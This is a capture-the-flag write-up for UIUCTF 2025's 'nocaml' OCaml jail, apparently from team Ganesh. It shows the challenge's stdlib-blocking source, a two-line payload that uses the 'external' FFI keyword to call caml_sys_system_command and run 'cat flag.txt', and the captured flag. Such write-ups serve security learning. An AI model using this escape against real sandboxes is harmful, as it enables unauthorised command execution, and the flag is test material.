---
title: "nocaml - UIUCTF 2025"
category: "misc"
subcategory: "python"
type: "writeup"
tags: ["misc", "jail", "ocaml", "python-bytecode", "base64", "python", "uiuctf", "uiuctf-2025", "2025", "ctf-writeup"]
summary: "This was a standard OCaml jail challenge, we are given this description:"
source:
  name: "CTFtime writeup #40362"
  url: "https://ctftime.org/writeup/40362"
original_source: "https://ganesh.icmc.usp.br/en/content/article/cmdqcib4f000yjw0ni25dq253"
ctf:
  name: "UIUCTF 2025"
  year: 2025
  challenge: "nocaml"
---

## Metadata

- **CTF:** UIUCTF 2025
- **Task:** nocaml
- **Author team:** Ganesh
- **CTFtime tags:** misc, jail, ocaml
- **CTFtime:** <https://ctftime.org/writeup/40362>
- **Original writeup:** <https://ganesh.icmc.usp.br/en/content/article/cmdqcib4f000yjw0ni25dq253>

---
# Introduction

This was a standard OCaml jail challenge, we are given this description:  
```  
How to read files without the standard library? ??  
For weird infra reasons unrelated to actual solve, here's the gnarly command to test your solution:

(base64 -w0 [your-solution.ml](http://your-solution.ml); echo) | ncat --no-shutdown --ssl [nocaml.chal.uiuc.tf](http://nocaml.chal.uiuc.tf) 1337

author: n8  
```

Inspecting the provided files, we see in `[go.sh](http://go.sh)` that the jail loads `[Nocaml.ml](http://Nocaml.ml)` which blacklists the standard library and a great set of functions.

`[go.sh](http://go.sh)`:  
```bash  
#!/bin/bash  
tmp_dir=$(mktemp -d /tmp/ocaml_XXXXXX)

cleanup() {  
rm -rf "$tmp_dir"  
}  
trap cleanup EXIT

read -r line && echo "$line" | base64 -d > "$tmp_dir/[code.ml](http://code.ml)"  
ocamlc -o "$tmp_dir/out" -open Nocaml "$tmp_dir/[code.ml](http://code.ml)" && "$tmp_dir/out"  
```

`[nocaml.ml](http://nocaml.ml)`:  
```ocaml  
let raise = ()  
let raise_notrace = ()  
let invalid_arg = ()  
let failwith = ()  
let ( = ) = ()  
let ( <> ) = ()  
let ( < ) = ()  
let ( > ) = ()  
let ( <= ) = ()  
let ( >= ) = ()  
let compare = ()  
let min = ()  
let max = ()  
let ( == ) = ()  
let ( != ) = ()  
let not = ()  
let ( && ) = ()  
let ( || ) = ()  
let __LOC__ = ()  
let __FILE__ = ()  
let __LINE__ = ()  
let __MODULE__ = ()  
let __POS__ = ()  
let __FUNCTION__ = ()  
let __LOC_OF__ = ()  
let __LINE_OF__ = ()  
let __POS_OF__ = ()  
let ( |> ) = ()  
let ( @@ ) = ()  
let ( ~- ) = ()  
let ( ~+ ) = ()  
let succ = ()  
let pred = ()  
let ( + ) = ()  
let ( - ) = ()  
let ( * ) = ()  
let ( / ) = ()  
let ( mod ) = ()  
let abs = ()  
let max_int = ()  
let min_int = ()  
let ( land ) = ()  
let ( lor ) = ()  
let ( lxor ) = ()  
let lnot = ()  
let ( lsl ) = ()  
let ( lsr ) = ()  
let ( asr ) = ()  
let ( ~-. ) = ()  
let ( ~+. ) = ()  
let ( +. ) = ()  
let ( -. ) = ()  
let ( *. ) = ()  
let ( /. ) = ()  
let ( ** ) = ()  
let sqrt = ()  
let exp = ()  
let log = ()  
let log10 = ()  
let expm1 = ()  
let log1p = ()  
let cos = ()  
let sin = ()  
let tan = ()  
let acos = ()  
let asin = ()  
let atan = ()  
let atan2 = ()  
let hypot = ()  
let cosh = ()  
let sinh = ()  
let tanh = ()  
let acosh = ()  
let asinh = ()  
let atanh = ()  
let ceil = ()  
let floor = ()  
let abs_float = ()  
let copysign = ()  
let mod_float = ()  
let frexp = ()  
let float_of_int = ()  
let truncate = ()  
let int_of_float = ()  
let infinity = ()  
let neg_infinity = ()  
let nan = ()  
let max_float = ()  
let min_float = ()  
let epsilon_float = ()  
type fpclass  
let classify_float = ()  
let ( ^ ) = ()  
let int_of_char = ()  
let char_of_int = ()  
let ignore = ()  
let string_of_bool = ()  
let bool_of_string_opt = ()  
let bool_of_string = ()  
let string_of_int = ()  
let int_of_string_opt = ()  
let int_of_string = ()  
let string_of_float = ()  
let float_of_string_opt = ()  
let float_of_string = ()  
let fst = ()  
let snd = ()  
let ( @ ) = ()  
type in_channel  
type out_channel  
let stdin = ()  
let stdout = ()  
let stderr = ()  
let print_char = ()  
let print_string = ()  
let print_bytes = ()  
let print_int = ()  
let print_float = ()  
let print_endline = ()  
let print_newline = ()  
let prerr_char = ()  
let prerr_string = ()  
let prerr_bytes = ()  
let prerr_int = ()  
let prerr_float = ()  
let prerr_endline = ()  
let prerr_newline = ()  
let read_line = ()  
let read_int_opt = ()  
let read_int = ()  
let read_float_opt = ()  
let read_float = ()  
type open_flag  
let open_out = ()  
let open_out_bin = ()  
let open_out_gen = ()  
let flush = ()  
let flush_all = ()  
let output_char = ()  
let output_string = ()  
let output_bytes = ()  
let output = ()  
let output_substring = ()  
let output_byte = ()  
let output_binary_int = ()  
let output_value = ()  
let seek_out = ()  
let pos_out = ()  
let out_channel_length = ()  
let close_out = ()  
let close_out_noerr = ()  
let set_binary_mode_out = ()  
let open_in = ()  
let open_in_bin = ()  
let open_in_gen = ()  
let input_char = ()  
let input_line = ()  
let input = ()  
let really_input = ()  
let really_input_string = ()  
let input_byte = ()  
let input_binary_int = ()  
let input_value = ()  
let seek_in = ()  
let pos_in = ()  
let in_channel_length = ()  
let close_in = ()  
let close_in_noerr = ()  
let set_binary_mode_in = ()  
module LargeFile = struct end  
type 'a ref  
let ref = ()  
let ( ! ) = ()  
type ('a, 'b, 'c, 'd, 'e, 'f) format6  
type ('a, 'b, 'c, 'd) format4  
type ('a, 'b, 'c) format  
let string_of_format = ()  
let exit = ()  
let at_exit = ()  
let valid_float_lexem = ()  
let unsafe_really_input = ()  
let do_at_exit = ()  
let do_domain_local_at_exit = ()  
module Arg = struct end  
module Array = struct end  
module ArrayLabels = struct end  
module Atomic = struct end  
module Bigarray = struct end  
module Bool = struct end  
module Buffer = struct end  
module Bytes = struct end  
module BytesLabels = struct end  
module Callback = struct end  
module Char = struct end  
module Complex = struct end  
module Condition = struct end  
module Digest = struct end  
module Domain = struct end  
module Dynarray = struct end  
module Effect = struct end  
module Either = struct end  
module Ephemeron = struct end  
module Filename = struct end  
module Float = struct end  
module Format = struct end  
module Fun = struct end  
module Gc = struct end  
module Hashtbl = struct end  
module In_channel = struct end  
module Int = struct end  
module Int32 = struct end  
module Int64 = struct end  
module Lazy = struct end  
module Lexing = struct end  
module List = struct end  
module ListLabels = struct end  
module Map = struct end  
module Marshal = struct end  
module MoreLabels = struct end  
module Mutex = struct end  
module Nativeint = struct end  
module Obj = struct end  
module Oo = struct end  
module Option = struct end  
module Out_channel = struct end  
module Parsing = struct end  
module Printexc = struct end  
module Printf = struct end  
module Queue = struct end  
module Random = struct end  
module Result = struct end  
module Scanf = struct end  
module Semaphore = struct end  
module Seq = struct end  
module Set = struct end  
module Stack = struct end  
module StdLabels = struct end  
module Stdlib = struct end  
module String = struct end  
module StringLabels = struct end  
module Sys = struct end  
module Type = struct end  
module Uchar = struct end  
module Unit = struct end  
module Weak = struct end  
```

# Solution

The solution is quite simple. In OCaml we can import system functions through the [FFI](<https://ocaml.org/manual/5.3/intfc.html>) using the `external` keyword, which isn't blocked:  
```ocaml  
external name : type = C-function-name  
```

With this breakthrough I tried linking to the `system` function, no luck. Then I searched for a function that was equivalent to C's `system`, and I found: `caml_sys_system_command`.

### Final payload:  
```ocaml  
external sys_command : string -> int = "caml_sys_system_command"  
let _ = sys_command "cat flag.txt"  
```

### Flag:  
uiuctf{nocaml_79976241e31bee31e37c42885}
